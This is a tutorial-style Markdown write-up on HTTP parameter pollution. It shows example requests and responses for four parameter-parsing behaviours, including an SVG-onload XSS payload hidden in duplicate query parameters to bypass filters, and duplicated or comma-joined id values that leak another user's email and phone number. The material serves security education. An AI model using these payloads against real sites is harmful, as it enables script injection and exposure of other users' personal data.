## Anatomy of Parameter Pollution :
The manipulation of the value of each parameter depends on how each web technology is parsing these parameters. Some web technologies parse the first or the last occurrence of the parameter, some concatenate all the inputs and others will create an array of parameters.

<p align="center">
  <img 
    width="600"
    height="700"
    src="https://user-images.githubusercontent.com/63053441/159308061-dd00ec1d-bc07-406f-9e19-7a654ff4af54.png"
  >
</p>

## 1 - All occurrences of specific parameter :
  This means that if we parse the same name parameters like q=hello&q=”><svg/onload=alert(1)> the check will be performed on both the parameters because they have the same name. In All occurrences, the barrier is if the back-end logic is configured to allow a specific parameter only 1 time then appending another parameter (q=hello&q=”><svg/onload=alert(1)>) of same name will give you an error.

<br></br>
Request :
```
POST /details HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0

id=100&id=101
```
Response :
```
HTTP/1.1 403
server: nginx
content-type: application/json
cache-control: no-cache, private
```
HTTP Parameter Pollution Request :
```
POST /details HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0

id=100,101
```
HTTP Parameter Pollution Response :
```
HTTP/1.1 200 OK
server: nginx
content-type: application/json
cache-control: no-cache, private

{

"email":"yourmail@gmail.com","phoneNumber":+91-9999999999,"email":"victim@gmail.com","phoneNumber":+91-8888888888

}
```

## 2 - First occurrence :
  First occurrence means a web application performs input validation on the first parameter which makes it vulnerable to second parameter which should be of same name.

Request :
```
GET /search?q="><svg/onload=alert(1)> HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
```
Response :
```
HTTP/1.1 403 Forbidden
server: nginx
content-type: application/json
cache-control: no-cache, private
```
HTTP Parameter Pollution Request :
```
GET /search?q=Hello&q="><svg/onload=alert(1)> HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
```
HTTP Parameter Pollution Response :
```
HTTP/1.1 200 OK
server: nginx
content-type: application/json
cache-control: no-cache, private
```
In the above mentioned polluted request only the first occurrence (q=Hello) is checked and the last occurrence (q=”><svg/onload=alert(1)>) is not sanitized which means it will trigger XSS.


## 3 - Last occurrence :
  Last occurrence means a web application performs input validation on the last parameter which makes it vulnerable to first parameter which should be of same name.
  
Request :
```
GET /search?q="><svg/onload=alert(1)> HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
```
Response :
```
HTTP/1.1 403 Forbidden
server: nginx
content-type: application/json
cache-control: no-cache, private
```
HTTP Parameter Pollution Request :
```
GET /search?q="><svg/onload=alert(1)>&q=Hello HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0
```
HTTP Parameter Pollution Response :
```
HTTP/1.1 200 OK
server: nginx
content-type: application/json
cache-control: no-cache, private
```
In the above mentioned polluted request only the last occurrence (q=Hello) is checked and the first occurrence (q="><svg/onload=alert(1)>) is not sanitized which means it will trigger XSS.

## 4 - Becomes an array :
  Becomes an array means whatever the input is sent from the client side the server parsed it into an array and displays it. Which means the parameter which you are polluting has an array as datatype, which is also the most vulnerable.
  
Request :
```
POST /details HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0

id=100
```
Response :
```
HTTP/1.1 200 OK
server: nginx
content-type: application/json
cache-control: no-cache, private

{

"email":["yourmail@gmail.com"],"phoneNumber":[+91-9999999999]

}
```
HTTP Parameter Pollution Request :
```
POST /details HTTP/1.1
Host: site.target.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0

id=100&id=101
```
HTTP Parameter Pollution Response :
```
HTTP/1.1 200 OK
server: nginx
content-type: application/json
cache-control: no-cache, private

{

"email":["yourmail@gmail.com","victim@gmail.com"],"phoneNumber":[+91-9999999999,+91-8888888888]

}
```
#### Refrences: https://shahjerry33.medium.com/parameter-pollution-zero-day-3feb86ee8a02
